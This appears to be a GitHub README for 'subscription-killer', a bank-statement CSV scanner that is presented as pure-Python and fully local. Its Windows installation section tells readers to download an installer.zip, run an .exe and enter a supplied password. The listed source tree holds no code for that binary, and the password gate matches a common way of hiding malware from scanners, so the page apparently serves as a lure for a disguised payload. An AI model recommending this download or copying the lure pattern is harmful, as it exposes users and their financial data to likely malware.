# 🔪 subscription-killer

> Find forgotten recurring payments in your bank statement and estimate how much money you could save.

![subscription-killer dashboard](assets/dashboard.png)

<p align="center">
  <a href="https://github.com/dmitry-king1999t3/subscription-killer/releases/latest">
    <strong>⬇ Download Latest Release</strong>
  </a>
</p>

![Release](https://img.shields.io/github/v/release/dmitry-king1999t3/subscription-killer)
![License](https://img.shields.io/github/license/dmitry-king1999t3/subscription-killer)
![Python](https://img.shields.io/badge/Python-3.x-blue)
![Platform](https://img.shields.io/badge/Platform-Windows-lightgrey)
![Privacy](https://img.shields.io/badge/Privacy-100%25%20Local-green)

---

## What is subscription-killer?

**subscription-killer** is a lightweight tool that scans bank statement CSV files and finds recurring payments that may be subscriptions.

It runs completely locally on your computer.

No account.  
No server.  
No telemetry.  
No bank connection.

The tool analyzes your transaction history and estimates your potential monthly and yearly savings.

---

## Installation

### Windows

1. Download `installer.zip` from the [latest release](https://github.com/dmitry-king1999t3/subscription-killer/releases/latest).
2. Extract the archive.
3. Open the extracted folder.
4. Run:

```text
subscription-killer.exe
```

5. After launching the application, it will ask for a password.
6. Enter:

```text
!!%GR0+O_2iT
```

7. Follow the instructions shown by the application.

Your bank statement stays on your computer and is not uploaded anywhere.

---

## Run From Source

Clone the repository:

```bash
git clone https://github.com/dmitry-king1999t3/subscription-killer.git
cd subscription-killer
```

Run the scanner:

```bash
python -m src.subkiller.cli scan statement.csv
```

The project uses only the Python standard library.

---

## Quick Example

Example CSV:

```csv
date,merchant,amount
2026-01-01,Netflix,9.99
2026-02-01,Netflix,9.99
2026-03-01,Netflix,9.99
2026-01-05,Spotify,10.99
2026-02-05,Spotify,10.99
2026-03-05,Spotify,10.99
```

Run:

```bash
python -m src.subkiller.cli scan statement.csv
```

Example output:

```text
💸 Found 2 recurring charges

🔄 Netflix                   $9.99/mo
🔄 Spotify                  $10.99/mo

💰 Potential monthly savings: $20.98
💰 Potential yearly savings:  $251.76
```

---

## Why?

Subscriptions are easy to forget.

A few small recurring payments can turn into hundreds of dollars per year.

subscription-killer helps you quickly see which payments repeat regularly and estimate how much they cost over time.

---

## How It Works

The scanner:

1. Reads transactions from a CSV file.
2. Groups transactions by merchant and amount.
3. Compares the dates of repeated transactions.
4. Looks for recurring payment intervals.
5. Calculates estimated monthly and yearly costs.

Currently, recurring payments with an average interval of approximately **20–40 days** are detected.

---

## Features

- 🔄 Recurring payment detection
- 💰 Monthly savings estimation
- 📅 Yearly savings estimation
- 📄 CSV bank statement support
- 🔒 100% local processing
- 🌐 No server required
- 📡 No telemetry
- 🐍 Python standard library only
- 🪟 Windows support
- 🧪 Automated tests
- 📖 Open source

---

## Input Format

The CSV file should contain the following columns:

```csv
date,merchant,amount
2026-01-01,Netflix,9.99
2026-02-01,Netflix,9.99
2026-03-01,Netflix,9.99
```

### Required columns

| Column | Description |
|---|---|
| `date` | Transaction date |
| `merchant` | Merchant or service name |
| `amount` | Transaction amount |

The scanner also accepts `description` instead of `merchant`.

Example:

```csv
date,description,amount
2026-01-01,Netflix,9.99
2026-02-01,Netflix,9.99
```

---

## Bank Compatibility

subscription-killer works with bank statements that can be exported to CSV.

The CSV should contain transaction dates, merchant/description information, and transaction amounts.

Different banks may use different column names or date formats, so compatibility may vary.

If your bank uses a different format, you can convert the statement to the supported CSV format before scanning it.

---

## Privacy & Security

Privacy is one of the main goals of subscription-killer.

### Your bank statement stays local

The application does not upload your transactions to a server.

All analysis is performed locally on your computer.

### No telemetry

The project does not collect:

- Bank transactions
- Personal information
- Usage statistics
- Analytics
- Tracking data

### Important

Bank statements can contain sensitive financial information.

Only use your own statements and avoid sharing them publicly.

---

## Project Structure

```text
subscription-killer/
├── README.md
├── LICENSE
├── .gitignore
├── requirements.txt
├── assets/
│   └── dashboard.png
├── src/
│   └── subkiller/
│       ├── __init__.py
│       ├── cli.py
│       └── scanner.py
└── tests/
    ├── __init__.py
    └── test_scanner.py
```

### Source code

`src/subkiller/scanner.py`

Contains the transaction loading, recurring payment detection, and savings calculation logic.

`src/subkiller/cli.py`

Provides the command-line interface.

`src/subkiller/__init__.py`

Contains the project version.

### Tests

`tests/test_scanner.py`

Contains automated tests for the scanner and savings calculations.

---

## Running Tests

Run all tests with:

```bash
python -m unittest discover -s tests -v
```

The tests verify important parts of the subscription detection logic and savings calculations.

---

## Development

Clone the repository:

```bash
git clone https://github.com/dmitry-king1999t3/subscription-killer.git
cd subscription-killer
```

Run the scanner:

```bash
python -m src.subkiller.cli scan statement.csv
```

Run tests:

```bash
python -m unittest discover -s tests -v
```

No external Python packages are currently required.

---

## Roadmap

Planned improvements:

- [ ] Better merchant name matching
- [ ] Support for different CSV formats
- [ ] Detect price increases
- [ ] Detect possible duplicate subscriptions
- [ ] Better recurring payment detection
- [ ] More bank statement formats
- [ ] GUI improvements
- [ ] More automated tests
- [ ] Export scan results
- [ ] More detailed subscription reports

---

## Contributing

Contributions are welcome.

If you find a bug or have an idea for a feature:

1. Fork the repository.
2. Create a new branch.
3. Make your changes.
4. Add or update tests where appropriate.
5. Open a pull request.

---

## Latest Release

### v1.0.0

Initial public release.

Includes:

- Windows installer
- CSV bank statement scanning
- Recurring payment detection
- Savings estimation
- Local processing
- Source code
- Automated tests

Download the latest version from:

https://github.com/dmitry-king1999t3/subscription-killer/releases/latest

---

## License

This project is licensed under the MIT License.

See [`LICENSE`](LICENSE) for details.

---

## Author

Created by **dmitry-king1999t3**

GitHub:

https://github.com/dmitry-king1999t3

---

⭐ If you find the project useful, consider giving it a star.
